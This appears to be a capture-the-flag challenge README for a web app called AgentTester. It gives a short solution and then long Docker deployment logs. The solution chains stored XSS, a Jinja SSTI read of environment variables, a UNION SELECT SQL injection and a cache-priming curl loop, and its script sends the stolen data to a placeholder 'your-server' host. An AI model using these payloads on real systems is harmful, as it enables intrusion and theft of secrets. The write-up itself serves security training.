# AgentTester

## Description

We've recently hired an entry-level web developer to build an internal system to test User Agents, let us know if you find any error!

## Solution

* [Solver](https://gist.github.com/jorgectf/d6a01fa0d8ba3905196b9b41a78ab4d1)

* Create an account
* Go to Profile
* Inject in About -> (SSTI can be abused using "environ" because of backend.py:25 or leaking classes until reading /proc/self/environ or running "env")
```
"><script>
fetch('/debug', {method: 'POST', headers: new Headers({'Content-Type': 'application/x-www-form-urlencoded'}), body: "code={{ environ }}"})
  .then(response => response.text())
  .then(data => fetch("http://your-server/?flag="+encodeURIComponent(data)));
</script>
```
* Go to index and send `' UNION SELECT 'NotARandomString', 'http://nginx/profile/<your-id>' -- ` (Leaving an authed curl fetching `/profile/<your-id>` with UA `NotARandomString` for the cache to make the bot able to visit your profile)
```
while true; do curl -I chall-ip/profile/<your-id> -b "auth=<your-auth>" -H "User-Agent: NotARandomString"; sleep 1; done
```
* Wait for the bot to visit `http://nginx/profile/<your-id>` (cached aka `X-Cache-Status: HIT`), execute that JS and receive the flag in your server.



## Expected behaviour
```
/AgentTester# ./deploy.sh 
Removing agenttester_nginx_1   ... done
Removing agenttester_browser_1 ... done
Removing agenttester_app_1     ... done
Removing agenttester_redis_1   ... done
Removing agenttester_mysql_1   ... done
Removing agenttester_chrome_1  ... done
Removing network agenttester_default
Removing network agenttester_isolated
Creating network "agenttester_default" with driver "bridge"
Creating network "agenttester_isolated" with driver "bridge"
Building browser
Step 1/6 : FROM python:3.8-slim
 ---> 5bacf0a78697
Step 2/6 : WORKDIR /browser
 ---> Using cache
 ---> b69997efc8ab
Step 3/6 : COPY browser.py .
 ---> Using cache
 ---> 7bfc7a59b663
Step 4/6 : COPY requirements.txt .
 ---> Using cache
 ---> db141606dbb9
Step 5/6 : RUN pip3 install --no-cache-dir -r requirements.txt
 ---> Using cache
 ---> febce98df953
Step 6/6 : ENTRYPOINT python3 -u browser.py
 ---> Using cache
 ---> 0f50f0c93a13

Successfully built 0f50f0c93a13
Successfully tagged agenttester_browser:latest
Building app
Step 1/6 : FROM python:3.8-slim
 ---> 5bacf0a78697
Step 2/6 : RUN apt update -y && apt install gcc libssl-dev -y
 ---> Using cache
 ---> 5e0b8c3dd651
Step 3/6 : WORKDIR /app
 ---> Using cache
 ---> e97cf7e9df37
Step 4/6 : COPY app/ .
 ---> 897df4750d20
Step 5/6 : RUN pip3 install --no-cache-dir -r requirements.txt
 ---> Running in 93a089653803
Collecting uwsgi
  Downloading uWSGI-2.0.19.1.tar.gz (803 kB)
Collecting click
  Downloading click-7.1.2-py2.py3-none-any.whl (82 kB)
Collecting Flask
  Downloading Flask-1.1.2-py2.py3-none-any.whl (94 kB)
Collecting Flask-SQLAlchemy
  Downloading Flask_SQLAlchemy-2.4.4-py2.py3-none-any.whl (17 kB)
Collecting itsdangerous
  Downloading itsdangerous-1.1.0-py2.py3-none-any.whl (16 kB)
Collecting Jinja2
  Downloading Jinja2-2.11.3-py2.py3-none-any.whl (125 kB)
Collecting MarkupSafe
  Downloading MarkupSafe-1.1.1-cp38-cp38-manylinux2010_x86_64.whl (32 kB)
Collecting pyotp
  Downloading pyotp-2.6.0-py2.py3-none-any.whl (11 kB)
Collecting SQLAlchemy
  Downloading SQLAlchemy-1.3.23-cp38-cp38-manylinux2010_x86_64.whl (1.3 MB)
Collecting Werkzeug
  Downloading Werkzeug-1.0.1-py2.py3-none-any.whl (298 kB)
Collecting pymysql
  Downloading PyMySQL-1.0.2-py3-none-any.whl (43 kB)
Collecting gevent
  Downloading gevent-21.1.2-cp38-cp38-manylinux2010_x86_64.whl (6.3 MB)
Collecting Flask-uWSGI-WebSocket
  Downloading Flask-uWSGI-WebSocket-0.6.1.tar.gz (10 kB)
Collecting redis
  Downloading redis-3.5.3-py2.py3-none-any.whl (72 kB)
Collecting greenlet<2.0,>=0.4.17
  Downloading greenlet-1.0.0-cp38-cp38-manylinux2010_x86_64.whl (165 kB)
Collecting zope.interface
  Downloading zope.interface-5.2.0-cp38-cp38-manylinux2010_x86_64.whl (244 kB)
Requirement already satisfied: setuptools in /usr/local/lib/python3.8/site-packages (from gevent->-r requirements.txt (line 12)) (53.0.0)
Collecting zope.event
  Downloading zope.event-4.5.0-py2.py3-none-any.whl (6.8 kB)
Building wheels for collected packages: Flask-uWSGI-WebSocket, uwsgi
  Building wheel for Flask-uWSGI-WebSocket (setup.py): started
  Building wheel for Flask-uWSGI-WebSocket (setup.py): finished with status 'done'
  Created wheel for Flask-uWSGI-WebSocket: filename=Flask_uWSGI_WebSocket-0.6.1-py3-none-any.whl size=10798 sha256=efd651f8b60dad3809592564019aff438b70d03b9a250d75500fb2be7461106d
  Stored in directory: /tmp/pip-ephem-wheel-cache-bj2g851b/wheels/6b/c0/63/5388603d2fc50fac319d36e5db4e5ed3d0ce8c11097bcd416a
  Building wheel for uwsgi (setup.py): started
  Building wheel for uwsgi (setup.py): finished with status 'done'
  Created wheel for uwsgi: filename=uWSGI-2.0.19.1-cp38-cp38-linux_x86_64.whl size=536631 sha256=9836679f2776a66fcbf8a9076c0e101841e798a02bb964345ee0cd2ab266b9a9
  Stored in directory: /tmp/pip-ephem-wheel-cache-bj2g851b/wheels/87/01/0f/2fc9c74a1ae010de7d8b17d90f6b39595cbb8ac5169345fcb8
Successfully built Flask-uWSGI-WebSocket uwsgi
Installing collected packages: MarkupSafe, Werkzeug, Jinja2, itsdangerous, click, zope.interface, zope.event, uwsgi, SQLAlchemy, greenlet, Flask, redis, pyotp, pymysql, gevent, Flask-uWSGI-WebSocket, Flask-SQLAlchemy        
Successfully installed Flask-1.1.2 Flask-SQLAlchemy-2.4.4 Flask-uWSGI-WebSocket-0.6.1 Jinja2-2.11.3 MarkupSafe-1.1.1 SQLAlchemy-1.3.23 Werkzeug-1.0.1 click-7.1.2 gevent-21.1.2 greenlet-1.0.0 itsdangerous-1.1.0 pymysql-1.0.2 
pyotp-2.6.0 redis-3.5.3 uwsgi-2.0.19.1 zope.event-4.5.0 zope.interface-5.2.0
Removing intermediate container 93a089653803
 ---> 9842058caa56
Step 6/6 : ENTRYPOINT uwsgi --ini app.ini
 ---> Running in 81d8bc2e921c
Removing intermediate container 81d8bc2e921c
 ---> b14a0cff8218

Successfully built b14a0cff8218
Successfully tagged agenttester_app:latest
Creating agenttester_redis_1  ... done
Creating agenttester_mysql_1  ... done
Creating agenttester_chrome_1 ... done
Creating agenttester_app_1     ... done
Creating agenttester_browser_1 ... done
Creating agenttester_nginx_1   ... done
Attaching to agenttester_mysql_1, agenttester_chrome_1, agenttester_redis_1, agenttester_browser_1, agenttester_app_1, agenttester_nginx_1
app_1      | [uWSGI] getting INI configuration from app.ini
app_1      | *** Starting uWSGI 2.0.19.1 (64bit) on [Sat Feb 27 23:15:20 2021] ***
app_1      | compiled with version: 8.3.0 on 27 February 2021 23:15:03
app_1      | os: Linux-4.19.84-microsoft-standard #1 SMP Wed Nov 13 11:44:37 UTC 2019
app_1      | nodename: 2c63f1a0aabd
app_1      | machine: x86_64
app_1      | clock source: unix
app_1      | detected number of CPU cores: 4
app_1      | current working directory: /app
app_1      | detected binary path: /usr/local/bin/uwsgi
app_1      | !!! no internal routing support, rebuild with pcre support !!!
app_1      | setuid() to 65534
app_1      | your memory page size is 4096 bytes
app_1      |  *** WARNING: you have enabled harakiri without post buffering. Slow upload could be rejected on post-unbuffered webservers ***
app_1      | detected max file descriptor number: 1048576
app_1      | - async cores set to 1000 - fd table size: 1048576
app_1      | lock engine: pthread robust mutexes
app_1      | thunder lock: disabled (you can enable it with --thunder-lock)
mysql_1    | 2021-02-27 23:15:18+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.23-1debian10 
started.
mysql_1    | 2021-02-27 23:15:18+00:00 [Note] [Entrypoint]: Switching to dedicated user 'mysql'
mysql_1    | 2021-02-27 23:15:18+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.23-1debian10 
started.
mysql_1    | 2021-02-27 23:15:18+00:00 [Note] [Entrypoint]: Initializing database files
mysql_1    | 2021-02-27T23:15:18.803867Z 0 [System] [MY-013169] [Server] /usr/sbin/mysqld (mysqld 8.0.23) initializing of server in progress as process 46
mysql_1    | 2021-02-27T23:15:18.811155Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.     
chrome_1   | 2021-02-27 23:15:18,920 INFO Included extra file "/etc/supervisor/conf.d/selenium.conf" during parsing
app_1      | uWSGI http bound on 0.0.0.0:4000 fd 4
app_1      | uwsgi socket 0 bound to TCP address 127.0.0.1:44989 (port auto-assigned) fd 3
app_1      | Python version: 3.8.8 (default, Feb 19 2021, 18:07:06)  [GCC 8.3.0]
nginx_1    | /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration   
nginx_1    | /docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/
nginx_1    | /docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh
app_1      | Python main interpreter initialized at 0x559eb2fe5dd0
app_1      | python threads support enabled
app_1      | your server socket listen backlog is limited to 100 connections
app_1      | your mercy for graceful operations on workers is 3600 seconds
nginx_1    | 10-listen-on-ipv6-by-default.sh: info: /etc/nginx/conf.d/default.conf is not a file or does not exist
app_1      | mapped 21036928 bytes (20543 KB) for 1000 cores
app_1      | *** Operational MODE: async ***
nginx_1    | /docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh
nginx_1    | /docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh
chrome_1   | 2021-02-27 23:15:18,922 INFO supervisord started with pid 8
mysql_1    | 2021-02-27T23:15:19.656898Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.       
nginx_1    | /docker-entrypoint.sh: Configuration complete; ready for start up
redis_1    | 1:C 27 Feb 2021 23:15:19.033 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
redis_1    | 1:C 27 Feb 2021 23:15:19.033 # Redis version=6.2.0, bits=64, commit=00000000, modified=0, pid=1, just started
redis_1    | 1:C 27 Feb 2021 23:15:19.033 # Warning: no config file specified, using the default config. In order to specify a config file use redis-server /path/to/redis.conf
chrome_1   | 2021-02-27 23:15:19,924 INFO spawned: 'xvfb' with pid 10
chrome_1   | 2021-02-27 23:15:19,925 INFO spawned: 'selenium-standalone' with pid 11
chrome_1   | 23:15:20.137 INFO [GridLauncherV3.parse] - Selenium server version: 3.141.59, revision: e82be7d358 
chrome_1   | 2021-02-27 23:15:20,139 INFO success: xvfb entered RUNNING state, process has stayed up for > than 
0 seconds (startsecs)
chrome_1   | 2021-02-27 23:15:20,139 INFO success: selenium-standalone entered RUNNING state, process has stayed up for > than 0 seconds (startsecs)
chrome_1   | 23:15:20.245 INFO [GridLauncherV3.lambda$buildLaunchers$3] - Launching a standalone Selenium Server on port 4444
chrome_1   | 2021-02-27 23:15:20.301:INFO::main: Logging initialized @362ms to org.seleniumhq.jetty9.util.log.StdErrLog
chrome_1   | 23:15:20.578 INFO [WebDriverServlet.<init>] - Initialising WebDriverServlet
chrome_1   | 23:15:20.782 INFO [SeleniumServer.boot] - Selenium Server is up and running on port 4444
app_1      | WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x559eb2fe5dd0 pid: 6 (default app)   
app_1      | *** uWSGI is running in multiple interpreter mode ***
app_1      | spawned uWSGI master process (pid: 6)
app_1      | spawned uWSGI worker 1 (pid: 8, cores: 1000)
app_1      | spawned uWSGI http 1 (pid: 9)
app_1      | *** running gevent loop engine [addr:0x559eb16b03c0] ***
redis_1    | 1:M 27 Feb 2021 23:15:19.033 * monotonic clock: POSIX clock_gettime
redis_1    | 1:M 27 Feb 2021 23:15:19.034 * Running mode=standalone, port=6379.
redis_1    | 1:M 27 Feb 2021 23:15:19.034 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.
redis_1    | 1:M 27 Feb 2021 23:15:19.034 # Server initialized
redis_1    | 1:M 27 Feb 2021 23:15:19.034 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or 
run the command 'sysctl vm.overcommit_memory=1' for this to take effect.
redis_1    | 1:M 27 Feb 2021 23:15:19.034 * Ready to accept connections
mysql_1    | 2021-02-27T23:15:22.179362Z 6 [Warning] [MY-010453] [Server] root@localhost is created with an empty password ! Please consider switching off the --initialize-insecure option.
mysql_1    | 2021-02-27 23:15:25+00:00 [Note] [Entrypoint]: Database files initialized
mysql_1    | 2021-02-27 23:15:25+00:00 [Note] [Entrypoint]: Starting temporary server
mysql_1    | 2021-02-27T23:15:25.912366Z 0 [System] [MY-010116] [Server] /usr/sbin/mysqld (mysqld 8.0.23) starting as process 91
mysql_1    | 2021-02-27T23:15:26.051273Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.
mysql_1    | 2021-02-27T23:15:26.323589Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.
mysql_1    | 2021-02-27T23:15:26.418110Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Socket: /var/run/mysqld/mysqlx.sock
mysql_1    | 2021-02-27T23:15:26.593924Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed.
mysql_1    | 2021-02-27T23:15:26.594071Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel.
mysql_1    | 2021-02-27T23:15:26.597263Z 0 [Warning] [MY-011810] [Server] Insecure configuration for --pid-file: Location '/var/run/mysqld' in the path is accessible to all OS users. Consider choosing a different directory. 
mysql_1    | 2021-02-27T23:15:26.614617Z 0 [System] [MY-010931] [Server] /usr/sbin/mysqld: ready for connections. Version: '8.0.23'  socket: '/var/run/mysqld/mysqld.sock'  port: 0  MySQL Community Server - GPL.
mysql_1    | 2021-02-27 23:15:26+00:00 [Note] [Entrypoint]: Temporary server started.
mysql_1    | Warning: Unable to load '/usr/share/zoneinfo/iso3166.tab' as time zone. Skipping it.
mysql_1    | Warning: Unable to load '/usr/share/zoneinfo/leap-seconds.list' as time zone. Skipping it.
mysql_1    | Warning: Unable to load '/usr/share/zoneinfo/zone.tab' as time zone. Skipping it.
mysql_1    | Warning: Unable to load '/usr/share/zoneinfo/zone1970.tab' as time zone. Skipping it.
mysql_1    | 2021-02-27 23:15:29+00:00 [Note] [Entrypoint]: GENERATED ROOT PASSWORD: Cahmungoo7aiGhei3Sou7quahpoh1aiX
mysql_1    | 
mysql_1    | 2021-02-27 23:15:29+00:00 [Note] [Entrypoint]: /usr/local/bin/docker-entrypoint.sh: running /docker-entrypoint-initdb.d/schema.sql
mysql_1    | 
mysql_1    | 
mysql_1    | 2021-02-27 23:15:29+00:00 [Note] [Entrypoint]: Stopping temporary server
mysql_1    | 2021-02-27T23:15:29.149455Z 11 [System] [MY-013172] [Server] Received SHUTDOWN from user root. Shutting down mysqld (Version: 8.0.23).
mysql_1    | 2021-02-27T23:15:30.425517Z 0 [System] [MY-010910] [Server] /usr/sbin/mysqld: Shutdown complete (mysqld 8.0.23)  MySQL Community Server - GPL.
mysql_1    | 2021-02-27 23:15:31+00:00 [Note] [Entrypoint]: Temporary server stopped
mysql_1    |
mysql_1    | 2021-02-27 23:15:31+00:00 [Note] [Entrypoint]: MySQL init process done. Ready for start up.
mysql_1    |
mysql_1    | 2021-02-27T23:15:31.387537Z 0 [System] [MY-010116] [Server] /usr/sbin/mysqld (mysqld 8.0.23) starting as process 1
mysql_1    | 2021-02-27T23:15:31.401642Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.
mysql_1    | 2021-02-27T23:15:31.746814Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.
mysql_1    | 2021-02-27T23:15:31.841751Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Bind-address: '::' port: 33060, socket: /var/run/mysqld/mysqlx.sock
mysql_1    | 2021-02-27T23:15:31.953439Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed.
mysql_1    | 2021-02-27T23:15:31.953633Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel.
mysql_1    | 2021-02-27T23:15:31.957612Z 0 [Warning] [MY-011810] [Server] Insecure configuration for --pid-file: Location '/var/run/mysqld' in the path is accessible to all OS users. Consider choosing a different directory. 
mysql_1    | 2021-02-27T23:15:31.974972Z 0 [System] [MY-010931] [Server] /usr/sbin/mysqld: ready for connections. Version: '8.0.23'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  MySQL Community Server - GPL.
mysql_1    | mbind: Operation not permitted
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:15:57 +0000] "GET / HTTP/1.1" 302 295 "http://127.0.0.1/signin?error=Invalid+session+please+sign+in" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:15:57 +0000] "GET /signin?error=Invalid+session+please+sign+in HTTP/1.1" 200 3061 "http://127.0.0.1/signin?error=Invalid+session+please+sign+in" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:16:23 +0000] "GET /signup HTTP/1.1" 200 4761 "http://127.0.0.1/signin?error=Invalid+session+please+sign+in" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:16:27 +0000] "POST /signup HTTP/1.1" 200 38 "http://127.0.0.1/signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:16:29 +0000] "GET /signin HTTP/1.1" 200 2982 "http://127.0.0.1/signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:16:32 +0000] "POST /signin HTTP/1.1" 302 209 "http://127.0.0.1/signin" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:16:32 +0000] "GET / HTTP/1.1" 200 3591 "http://127.0.0.1/signin" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:16:34 +0000] "GET /profile/2 HTTP/1.1" 200 3145 "http://127.0.0.1/" 
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:16:57 +0000] "POST /profile/2 HTTP/1.1" 200 3430 "http://127.0.0.1/profile/2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:16:57 +0000] "POST /debug HTTP/1.1" 200 12 "http://127.0.0.1/profile/2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:18 +0000] "GET / HTTP/1.1" 200 3591 "http://127.0.0.1/profile/2" 
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:33 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:34 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:35 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:36 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:37 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:38 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:39 +0000] "GET /req HTTP/1.1" 101 2 "-" "Mozilla/5.0 (Windows NT 
10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:39 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
chrome_1   | 23:17:40.072 INFO [ActiveSessionFactory.apply] - Capabilities are: {
chrome_1   |   "browserName": "chrome",
chrome_1   |   "goog:chromeOptions": {
chrome_1   |     "extensions": [
chrome_1   |     ],
chrome_1   |     "args": [
chrome_1   |       "--headless",
chrome_1   |       "--no-sandbox",
chrome_1   |       "ignore-certificate-errors",
chrome_1   |       "--disable-dev-shm-usage",
chrome_1   |       "--disable-gpu",
chrome_1   |       "user-agent=NotARandomString"
chrome_1   |     ]
chrome_1   |   },
chrome_1   |   "pageLoadStrategy": "none",
chrome_1   |   "version": ""
chrome_1   | }
chrome_1   | 23:17:40.073 INFO [ActiveSessionFactory.lambda$apply$11] - Matched factory org.openqa.selenium.grid.session.remote.ServicedSession$Factory (provider: org.openqa.selenium.chrome.ChromeDriverService)
chrome_1   | Starting ChromeDriver 88.0.4324.96 (68dba2[d8a106b1144496a718d630a.f0a9c05]6[fSaE7V4E6R4E8]0:3 2bbicnfd4(6)b -fraeiflse/db:r aCnch-heads/4324@{#1784}) on port 15087
chrome_1   | Only local connections are allowed.
chrome_1   | Please see https://chromedriver.chromium.org/security-considerations for suggestions on keeping ChromeDriver safe.
chrome_1   | ChromeDriver was started successfully.
chrome_1   | annot assign requested address (99)
chrome_1   | 23:17:40.475 INFO [ProtocolHandshake.createSession] - Detected dialect: W3C
chrome_1   | 23:17:40.495 INFO [RemoteSession$Factory.lambda$performHandshake$0] - Started new session eb99cf3b27f2bf31f051b05644c4cebf (org.openqa.selenium.chrome.ChromeDriverService)
nginx_1    | 172.29.0.2 - - [27/Feb/2021:23:17:40 +0000] "GET /signin HTTP/1.1" 200 2982 "-" "NotARandomString" 
"-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:40 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
nginx_1    | 172.29.0.2 - - [27/Feb/2021:23:17:41 +0000] "POST /signin HTTP/1.1" 302 209 "http://nginx/signin" "NotARandomString" "-"
nginx_1    | 172.29.0.2 - - [27/Feb/2021:23:17:41 +0000] "GET / HTTP/1.1" 200 3595 "http://nginx/signin" "NotARandomString" "-"
nginx_1    | 172.29.0.2 - - [27/Feb/2021:23:17:41 +0000] "GET /profile/2 HTTP/1.1" 200 3430 "-" "NotARandomString" "-"
nginx_1    | 172.29.0.2 - - [27/Feb/2021:23:17:41 +0000] "POST /debug HTTP/1.1" 200 1084 "http://nginx/profile/2" "NotARandomString" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:41 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:42 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:43 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:44 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:45 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:46 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:47 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
nginx_1    | 172.28.0.1 - - [27/Feb/2021:23:17:48 +0000] "HEAD /profile/2 HTTP/1.1" 200 0 "-" "NotARandomString" "-"
^CGracefully stopping... (press Ctrl+C again to force)
Stopping agenttester_nginx_1   ... done
Stopping agenttester_app_1     ... done
Stopping agenttester_browser_1 ... done
Stopping agenttester_chrome_1  ... done
Stopping agenttester_redis_1   ... done
Stopping agenttester_mysql_1   ... done
```